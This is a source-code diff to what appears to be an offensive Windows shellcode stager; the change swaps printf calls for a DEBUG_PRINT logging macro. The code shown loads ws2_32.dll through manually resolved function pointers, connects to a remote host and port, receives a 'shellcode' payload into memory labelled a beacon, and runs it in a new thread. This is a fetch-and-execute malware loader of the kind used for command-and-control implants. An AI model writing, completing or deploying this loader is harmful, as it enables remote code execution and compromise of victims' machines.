@@ -25,6 +25,7 @@
 
 #include "../utils/ministd.h"
 
+#include "logging.h"
 
 
 int run(const char* host, const char* port)
@@ -55,12 +56,12 @@ int run(const char* host, const char* port)
 
 	if (val != 0)
 	{
-		printf("error1: %d\n", val);
+		DEBUG_PRINT("error1: %d\n", val);
 		return 1;
 	}
 	else
 	{
-		printf("working\n");
+		DEBUG_PRINT("working\n");
 	}
 
 
@@ -107,15 +108,15 @@ int run(const char* host, const char* port)
     //usDllName.MaximumLength = 22;
     //usDllName.Buffer = L"ws2_32.dll";
     //SIZE_T Size = CharStringToWCharString(usDllName.Buffer, ModuleName, usDllName.MaximumLength);
-    //printf("size = %d", Size);
+    //DEBUG_PRINT("size = %d", Size);
     PVOID ws2_32_module; // ws2_32.dll pModule
     NTSTATUS status = pLdrLoadDll(NULL, NULL, &usDllName, &ws2_32_module);
     // TODO: for now we just assume it's always successful
     //if (!NT_SUCCESS(status))
     if (status != 0)
 	{
-        printf("status = %d\n", status);
-		//printf("pLdrLoadDll was unable to obtain valid dllBase\n");
+        DEBUG_PRINT("status = %d\n", status);
+		//DEBUG_PRINT("pLdrLoadDll was unable to obtain valid dllBase\n");
 	}
 
     //HMODULE ws2_32_module = GetModuleHandleManualHash(WS2_32_DLL_HASH); // TODO: this would need to be changed to loadlib or something
@@ -131,12 +132,12 @@ int run(const char* host, const char* port)
 
 	if (val != 0)
 	{
-		printf("error: %d\n", val);
+		DEBUG_PRINT("error: %d\n", val);
 		return 1;
 	}
 	else
 	{
-		printf("working\n");
+		DEBUG_PRINT("working\n");
 	}
 
     FuncWSAStartup pWSAStartup = (FuncWSAStartup)funcAddresses1[0];
@@ -159,12 +160,12 @@ int run(const char* host, const char* port)
 	*/
 
     //std::cout << "1 - Starting" << std::endl;
-	// printf("1 - Starting\n");
+	// DEBUG_PRINT("1 - Starting\n");
     
     WSADATA wsaData;
     if (pWSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
         //std::cout << "WSAStartup failed" << std::endl;
-        // printf("WSAStartup failed\n");
+        // DEBUG_PRINT("WSAStartup failed\n");
         return 1;
     }
 
@@ -172,13 +173,13 @@ int run(const char* host, const char* port)
     if (sock == INVALID_SOCKET) 
 	{
         //std::cout << "socket failed: " << WSAGetLastError() << std::endl;
-		// printf("socket failed: %d\n", WSAGetLastError());
-		printf("socket failed\n");
+		// DEBUG_PRINT("socket failed: %d\n", WSAGetLastError());
+		DEBUG_PRINT("socket failed\n");
         return 1;
     }
 
     //std::cout << "2 - Socket created" << std::endl;
-    // printf("2 - Socket created\n"); 
+    // DEBUG_PRINT("2 - Socket created\n"); 
 
     //ADDRINFOA hints, *result = nullptr;
     //ZeroMemory(&hints, sizeof(hints));
@@ -194,12 +195,12 @@ int run(const char* host, const char* port)
     if (pGetAddrInfo(host, port, &hints, &result) != 0) 
 	{
         //std::cout << "getaddrinfo failed" << std::endl;
-		printf("getaddrinfo failed\n");
+		DEBUG_PRINT("getaddrinfo failed\n");
         return 1;
     }
 
     //std::cout << "3 - Address resolved" << std::endl;
-    // printf("3 - Address resolved\n");
+    // DEBUG_PRINT("3 - Address resolved\n");
 
 
     int connected = 0;
@@ -218,13 +219,13 @@ int run(const char* host, const char* port)
     if (!connected) 
 	{
         //std::cout << "connect failed" << std::endl;
-        printf("connect failed\n");
+        DEBUG_PRINT("connect failed\n");
         return 1;
     }
 
     // 2.
     //std::cout << "4 - Connected" << std::endl;
-    // printf("4 - Connected\n");
+    // DEBUG_PRINT("4 - Connected\n");
 
 	//unsigned char shellcode[512];
 	//int bytes_received = recv(sock, (char*)shellcode, sizeof(shellcode), 0);
@@ -233,7 +234,7 @@ int run(const char* host, const char* port)
     //if (bytes_received <= 0) 
 	//{
         //std::cout << "recv failed, received: " << bytes_received << std::endl;
-        // printf("recv failed, received: %d\n", bytes_received);
+        // DEBUG_PRINT("recv failed, received: %d\n", bytes_received);
         //return 1;
     //}
 
@@ -258,18 +259,18 @@ int run(const char* host, const char* port)
 
     if (bytes_received <= 0)
     {
-        printf("Timeout waiting for shellcode\n");
+        DEBUG_PRINT("Timeout waiting for shellcode\n");
         return 1;
     }
 
     //std::cout << "5 - Received " << bytes_received << " bytes" << std::endl;
-    // printf("5 - Received %d bytes\n", bytes_received);
+    // DEBUG_PRINT("5 - Received %d bytes\n", bytes_received);
 
     LPVOID beacon_mem = pVirtualAlloc(0, bytes_received, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!beacon_mem) // TODO: checking if it is NULL would be more correct?
 	{
         //std::cout << "VirtualAlloc failed: " << GetLastError() << std::endl;
-        // printf("VirtualAlloc failed: %d\n", GetLastError());
+        // DEBUG_PRINT("VirtualAlloc failed: %d\n", GetLastError());
         return 1;
     }
 
@@ -290,7 +291,7 @@ int run(const char* host, const char* port)
     }
 
     //std::cout << "6 - Memory allocated and copied" << std::endl;
-    // printf("6 - Memory allocated and copied");
+    // DEBUG_PRINT("6 - Memory allocated and copied");
 
     // 4.
     //HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)beacon_mem, NULL, 0, NULL);
@@ -298,16 +299,16 @@ int run(const char* host, const char* port)
     if (!thread) 
 	{
         //std::cout << "CreateThread failed: " << GetLastError() << std::endl;
-        // printf("CreateThread failed: %d\n", GetLastError());
+        // DEBUG_PRINT("CreateThread failed: %d\n", GetLastError());
         return 1;
     }
 
     //std::cout << "7 - Thread created, waiting..." << std::endl;
-    // printf("7 - Thread created, waiting..."); 
+    // DEBUG_PRINT("7 - Thread created, waiting..."); 
     pWaitForSingleObject(thread, INFINITE); // Wait for thread to complete
 
     //std::cout << "8 - Cleaning up" << std::endl;
-    // printf("8 - Cleaning up"); 
+    // DEBUG_PRINT("8 - Cleaning up"); 
     pCloseSocket(sock);
     pWSACleanup();
     return 0;
